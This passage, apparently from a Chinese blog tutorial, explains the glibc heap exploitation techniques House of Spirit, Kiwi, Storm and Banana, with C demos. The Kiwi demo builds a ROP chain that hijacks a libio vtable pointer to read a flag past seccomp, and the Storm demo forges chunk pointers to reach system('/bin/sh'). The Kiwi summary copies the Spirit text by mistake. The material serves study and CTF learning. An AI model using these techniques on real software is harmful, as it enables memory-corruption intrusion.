<p><strong>利用条件:</strong></p>
<ol>
<li>能free指定地址</li>
</ol>
<p><strong>利用效果:</strong>获得包含目标地址的chunk</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>在可控区域伪造或寻找一个fake_chunk,并free它,使其进入fastbin中</p>
<p>fake_chunk的条件</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li>
<li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li>
<li>不能double free</li>
</ul>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h2 id="概要-8"><a href="#概要-8" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够触发<code>__malloc_assert</code>,通常是堆溢出导致</li>
<li>能够任意写,修改<code>_IO_file_sync</code>和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<p><strong>注意:</strong>因为house of kiwi要求能够修改libio中的vtable,这在许多版本glibc中是被禁止的,所以house of kiwi中提到的这条利用链不一定能够实现,但是其为我们提供了一个显式调用IO的方法,即通过assert触发fflush(stderr),从而调用stderr的vtable的sync,可以利用修改vtable偏移去调用别的vtable指针</p>
<h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><h4 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h4><ul>
<li><p>GLIBC 2.32/malloc.c:288</p>
<p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用_IO_file_jumps中的sync指针</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line"><span class="built_in">fflush</span> (stderr);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如何触发assert?在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk))位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p>
</li>
<li><p>GLIBC 2.32/malloc.c:2394</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p>
<ol>
<li>old_size &gt;= 0x20;</li>
<li>old_top.prev_inuse = 0;</li>
<li>old_top页对齐</li>
</ol>
<p>通过这里也可以触发assert</p>
</li>
</ul>
<p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且可以发现调用指针时RDX寄存器的值始终为<code>IO_helper_jumps</code>指针,这样就联系到了setcontext</p>
<p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span></span><br><span class="line"><span class="comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setROP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="type">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="type">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><h2 id="概要-9"><a href="#概要-9" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>House_of_storm</code>是一种结合了<code>unsorted_bin_attack</code>和<code>Largebin_attack</code>的攻击技术,其基本原理和<code>Largebin_attack</code>类似，但是不同的是<code>Largebin_attack</code>只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而<code>House_of_storm</code>则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大。<code>House_of_storm</code>虽然危害之大，但是其条件也是非常的苛刻。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>需要攻击者在<code>largebin</code>和<code>unsorted_bin</code>中分别布置一个chunk 这两个chunk需要在归位之后处于同一个<code>largebin</code>的index中,且<code>unsortedbin</code>中的chunk要比<code>largebin</code>中的大</li>
<li>需要<code>unsorted_bin</code>中的<code>bk指针</code>可控</li>
<li>需要<code>largebin</code>中的<code>bk指针和bk_nextsize</code>指针可控</li>
<li>更适用于有pie情况</li>
</ol>
<p><strong>利用效果:</strong>任意地址分配chunk</p>
<p><strong>有效版本:</strong>2.29</p>
<p><strong>失效原因:</strong>2.29unsorted_attck不再可行,2.30large_attack又被砍掉一半,且正好是该方式需要用的的部分</p>
<h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><hr>
<p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p>
<p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构,才会有后续的验证。</strong></p>
<p>说简单就是要绕过unsorted遍历时的size检查</p>
<p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。</p>
<h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p>
<p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p>
<p>0x55 : <code>1010101</code></p>
<p>0x56 : <code>1010110</code></p>
<p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    	(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure>
<p>可以看出只有高位为0x56的情况下能通过检测</p>
<h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h2 id="概要-10"><a href="#概要-10" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用largebin attack劫持_rtld_global中的字段,间接或直接控制fini_array,以便在函数正常退出或返回时调用布置的函数</p>
<p><strong>利用条件:</strong></p>
<ol>
<li><strong>程序能够显式的执行exit函数程序</strong>或者<strong>是通过libc_start_main启动的主函数，且主函数能够结束</strong>,二者需满足其一</li>
<li>largebin attack (可写free状态下largebin的bk_nextsize字段)</li>
</ol>
<p><strong>适用情况:</strong>存在largebin attack,Tcache Stashing Unlink Attack等</p>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><p>在ld.so里存在一个_rtld_global结构体</p>
<p>gpt对这个结构的解释</p>
<blockquote>
<p>在Linux中，ELF（可执行与可链接格式）是一种用于执行程序和共享库的标准文件格式。而_rtld_global结构体是在Linux系统中用于管理动态链接器（runtime linker）的全局数据结构。</p>
<p>动态链接器（runtime linker）是负责在程序运行时加载和链接共享库的组件。它的主要任务是解析程序的依赖关系，加载所需的共享库，并解析符号引用，以便将其绑定到正确的地址上。</p>
<p>_rtld_global结构体是动态链接器的关键数据结构之一，它存储了动态链接器在运行时所需的全局信息。该结构体定义了动态链接器的状态和属性，包括已加载的共享库列表、符号表、重定位表、全局变量等等。</p>
<p>通过_rtld_global结构体，动态链接器可以跟踪和管理程序的符号依赖关系、共享库的加载和卸载、符号解析和重定位等操作。它提供了一个全局的上下文，使得动态链接器能够正确地处理程序的运行时链接需求。</p>
<p>总而言之，_rtld_global结构体在Linux中的作用是为动态链接器提供全局的状态和信息，以支持程序的动态加载和链接过程。</p>
</blockquote>
<p>该结构体较为复杂</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="keyword">struct</span> <span class="title class_">link_namespaces</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *_ns_loaded;</span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  